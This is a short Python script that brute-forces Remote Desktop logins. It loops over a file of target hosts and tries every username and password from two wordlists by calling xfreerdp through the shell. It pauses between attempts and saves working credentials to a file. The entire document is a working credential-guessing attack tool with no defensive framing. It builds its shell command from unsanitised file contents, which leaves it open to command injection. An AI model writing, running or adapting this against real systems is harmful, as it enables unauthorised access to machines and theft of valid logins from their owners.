import subprocess
import os
import time
from tqdm import tqdm

username_list = "usernames.txt"
password_list = "passwords.lst"
target_list = "done.lst"
output_file = "valid_access.txt"
delay_seconds = 5

with open(target_list, "r") as f:
    targets = f.readlines()
    targets = [t.strip() for t in targets]

for target in targets:
    for user in open(username_list, 'r').readlines():
        user = user.strip()
        for password in open(password_list, 'r').readlines():
            password = password.strip()

            cmd = f'xfreerdp /v:{target} /u:"{user}" /p:"{password}" /sec-nla /cert-ignore /dynamic-resolution +fonts +auto-reconnect +home-drive'
            try:
                output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
                if "Authentication only, exit status 0" in output.decode('utf-8'):
                    print(f"{target} -> {user}:{password} succeeded!")
                    with open(output_file, "a") as f:
                        f.write(f"{target} -> {user}:{password}\n")
                else:
                    print(f"{target} -> {user}:{password} failed.")
            except subprocess.CalledProcessError as e:
                print(f"{target} -> {user}:{password} failed.")

            time.sleep(delay_seconds)

            # Print progress bar
            progress = f"Target: {target}, User: {user}, Password: {password}"
            with tqdm(total=1, desc=progress, position=0, leave=True) as pbar:
                pbar.update()
